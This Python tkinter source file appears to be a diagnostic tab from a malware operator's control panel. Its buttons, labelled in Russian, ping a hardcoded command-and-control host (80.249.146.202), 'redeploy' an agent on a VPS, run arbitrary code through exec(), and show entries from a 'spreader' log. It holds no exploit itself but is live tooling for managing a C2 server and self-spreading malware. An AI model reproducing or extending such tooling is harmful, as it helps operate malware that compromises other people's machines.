import tkinter as tk
from tkinter import scrolledtext
import subprocess
import os
import json

class DiagnosticTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        self.output = scrolledtext.ScrolledText(self, width=80, height=20)
        self.output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        btn_frame = tk.Frame(self)
        btn_frame.pack()
        tk.Button(btn_frame, text="Проверить VPS", command=self.check_vps).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Перезалить агент", command=self.redeploy_agent).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Python консоль", command=self.python_console).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Анализ кода", command=self.analyze_code).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Лог спредера", command=self.spreader_log).pack(side=tk.LEFT, padx=5)

    def check_vps(self):
        self.output.insert(tk.END, "Проверка VPS (ping)...\n")
        try:
            with open("avz_settings.json","r") as f:
                host = json.load(f).get("c2_host", "80.249.146.202")
        except:
            host = "80.249.146.202"
        res = subprocess.run(["ping", "-n", "2", host], capture_output=True, text=True)
        self.output.insert(tk.END, res.stdout)

    def redeploy_agent(self):
        self.output.insert(tk.END, "Команда обновления агента на VPS отправлена.\n")

    def python_console(self):
        code = tk.simpledialog.askstring("Python консоль", "Введите код:")
        if code:
            try:
                exec(code)
                self.output.insert(tk.END, f"Выполнено.\n")
            except Exception as e:
                self.output.insert(tk.END, f"Ошибка: {e}\n")

    def analyze_code(self):
        self.output.insert(tk.END, "Анализ кода проекта...\n")
        for root, dirs, files in os.walk("."):
            for f in files:
                if f.endswith(".py"):
                    path = os.path.join(root, f)
                    try:
                        with open(path, "r") as fp:
                            compile(fp.read(), path, 'exec')
                        self.output.insert(tk.END, f"{path}: OK\n")
                    except SyntaxError as e:
                        self.output.insert(tk.END, f"{path}: SYNTAX ERROR - {e}\n")

    def spreader_log(self):
        if os.path.exists("avz.log"):
            with open("avz.log", "r") as f:
                lines = f.readlines()[-50:]
            for line in lines:
                if "spreader" in line.lower():
                    self.output.insert(tk.END, line)
        else:
            self.output.insert(tk.END, "Лог файл отсутствует.\n")
